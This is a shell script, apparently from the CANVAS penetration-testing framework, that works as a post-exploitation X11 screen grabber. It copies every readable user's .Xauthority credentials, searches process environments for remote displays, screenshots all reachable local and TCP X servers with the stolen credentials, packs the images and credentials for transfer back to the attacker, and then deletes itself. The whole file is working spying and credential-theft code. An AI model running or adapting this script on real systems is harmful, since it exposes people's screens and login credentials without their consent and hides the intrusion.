#!/bin/sh
# License: CANVAS License
# (c) Immunity, Inc 2007
# Canvas X11 screengrabber
# Sept 2k7 Adam B
#
# Full featured X11 Screenshot script
# Will scour the system for X11 by
#	* looking for unix sockets in /tmp/.X11-unix
#   * looking for remote tcp displays in .Xauthority files
#   * checking the environment of all processes for tcp DISPLAY=
#
# Then, takes screenshots of them all, and tars them up
# for transmission back to CANVAS
# 
# Can be a bit noisy, and in tcp mode, will make outbound
# connections that might set off IDS.

echo "-= Canvas X11 Screengrabber =-"

XPATHS="/usr/openwin/bin:/usr/bin:/usr/X11R6/bin"
XTEMP="/tmp/.canvasXWD"
TIMEOUT=3       # Timeout in seconds for tcp x11 connects.
                # This is low, because if someone is doing X to it, it's gotta be
                # well connected

allUsers=y
tcpX=y
environSearch=y

if [ "$#" -gt 0 ]; then
	if [ "$1" = "-h" ]; then
		echo "Usage: $0 -a -t -e"
		echo " -a disable allUsers"
		echo " -t disable TCP Xserver grabbing"
		echo " -e disable environment searching"
		echo "Disabling allUsers also disables environment searching"
		echo "Disabling TCP also disables environment searching"
		exit 1
	else
		while true; do
			if [ "$1" = "-a" ]; then
				environSearch=n
				allUsers=n
			elif [ "$1" = "-e" ]; then
				environSearch=n
			elif [ "$1" = "-t" ]; then
				environSearch=n
				tcpX=n
			fi
			shift
			if [ -z "$1" ]; then
				break
			fi
		done
	fi
fi

os=`uname`;
if [ "$os" != "Linux" -a "$os" != "SunOS" ]; then
	echo "[!] Environment searching unsupported on $u"
	environSearch=n
fi

test "$allUsers" = "n" && echo "[!] All Users disabled, only current user"
test "$environSearch" = "n" && echo "[!] Environment searching disabled"
test "$tcpX" = "n" && echo "[!] TCP Xservers will be ignored"


# Step one, make sure we're equipped with 
# xwd and xauth in our path

echo "[x] Checking dependancies"
PATH=$PATH:$XPATHS
xwdPath=""

# Stupid Sol which doesn't set it's return val :(
xwdPath=`which xwd`
if [ "$?" -eq "1" -o -z "$xwdPath" ]; then 
	echo "[!] No xwd found :(";
	exit 1
fi
xauthPath=`which xauth`
if [ "$?" -eq "1" -o -z "$xauthPath" ]; then 
	echo "[!] No xauth found :(";
	exit 1
fi
echo "    All good"

# Create a temp dir
test -r $XTEMP  && rm -rf $XTEMP
mkdir $XTEMP

if [ "$allUsers" = "y" ]; then
	# Step two, enumerate users, steal their xauth tokens
	echo "[x] Stealing Xauth tokens..."
	for foo in `cut -f1,6 -d: /etc/passwd`; do 
		u=`echo $foo | cut -f1 -d:`
		h=`echo $foo | cut -f2 -d:`
		if [ -r $h/.Xauthority ]; then
			cp $h/.Xauthority $XTEMP/xauth-$u
		fi
	done
fi;

echo "[x] Screenshotting local unix socket Xservers..."
# Step 3: Enumerate unix X11 sockets, and take screenshots
for x in `ls /tmp/.X11-unix/X*`; do
	d=`basename $x | cut -c2-`
	echo "    Attempting screenshot of :$d"
	# Just try first; maybe is our user, maybe has no auth.
	xwd -display :$d -root -out $XTEMP/dpy-$d.xwd 2>/dev/null || { 
		# Hrm, now try each xauthority file we stole to see
		# if any of these have credentials...
		echo -n "     Trying stolen Xauth creds..."
		for xa in `ls $XTEMP/xauth-*`; do 
			XAUTHORITY=$xa xwd -display :$d -root -out $XTEMP/dpy-$d.xwd 2>/dev/null && break
			echo -n .
		done
		echo
	}
	test -r $XTEMP/dpy-$d.xwd && echo "     Woot, got shot dpy-$d.xwd" || echo "     Oh dear, no luck for dpy :$d"
done

envDpys=""
if [ "$environSearch" = "y" ]; then
	dpys=""
	for p in `ls /proc`; do
		if [ "$os" = "Linux" ]; then
			if [ -r "/proc/$p/environ" ]; then
				dpys="$dpys `sed 's/\x00/\n/g' "/proc/$p/environ"  2>/dev/null | egrep '^DISPLAY=[^:]' | cut -f2 -d=`"
			fi
		elif [ "$os" = "SunOS" ]; then
			dpys="$dpys `pargs -e $p 2>/dev/null | egrep 'DISPLAY=[^:]' | cut -f2 -d=`"
		fi
	done

	envDpys=`echo $dpys | sort | uniq`
fi

if [ "$tcpX" = "y" ]; then
	# Step 4, search for TCP xservers, and try and screenshot them too
	echo "[x] Screenshotting remote TCP socket Xservers discovered via Xauth..."
	# First we check for ones we found via xauth rummaging
	for xa in `ls $XTEMP/xauth-*`; do
		for d in `xauth -f $xa list | egrep -v ".*/unix:[0-9]+" | cut -f1 -d\ `; do
			if [ ! -r "$XTEMP/dpy-$d.xwd" ]; then
				echo "    Attempting screenshot of $d with creds of user `basename $xa | cut -f2 -d-`"
				XAUTHORITY=$xa xwd -display $d -root -out $XTEMP/dpy-$d.xwd 2>/dev/null &
                xwdpid=$!
                ( sleep $TIMEOUT && kill $xwdpid 2>&1 >/dev/null )&
                killapid=$!
                wait $xwdpid && echo "     Woot, got shot dpy-$d.xwd" || echo "     Oh dear, no luck for dpy $d" 
                kill $killapid 2>/dev/null
			fi
		done
	done
	# Now, any that were in the environments, but we didn't get via
	# xauth are worth trying, because they're probably xhost +ed :)
	echo "[x] Screenshotting remote TCP socket Xservers discovered via environment..."
	for d in $envDpys; do
		if [ ! -r $XTEMP/dpy-$d.xwd ]; then
			echo "    Attempting screenshot of $d"
			xwd -display $d -root -out $XTEMP/dpy-$d.xwd 2>/dev/null
            xwdpid=$!
            ( sleep $TIMEOUT && kill $xwdpid 2>&1 >/dev/null )&
            killapid=$!
            wait $xwdpid && echo "     Woot, got shot dpy-$d.xwd" || echo "     Oh dear, no luck for dpy $d" 
            kill $killapid 2>/dev/null
		fi
	done
fi

if ls $XTEMP/dpy-*; then
	# Step 5, tar it all up for transit back to canvas.
	echo "[x] Compressing screenshots..."
	cd $XTEMP
	tar cf - xauth-* dpy-* | gzip -c > $XTEMP/canvasX11screens.tar.gz
	echo "    File ready for transit: $XTEMP/canvasX11screens.tar.gz"
	echo "    Remember to vape: $XTEMP"
else
	echo "[!] No screenshots were successfully acquired"
	rm -rf $XTEMP
fi
# Commit seppuku
rm -f $0

echo "[x] Finished"
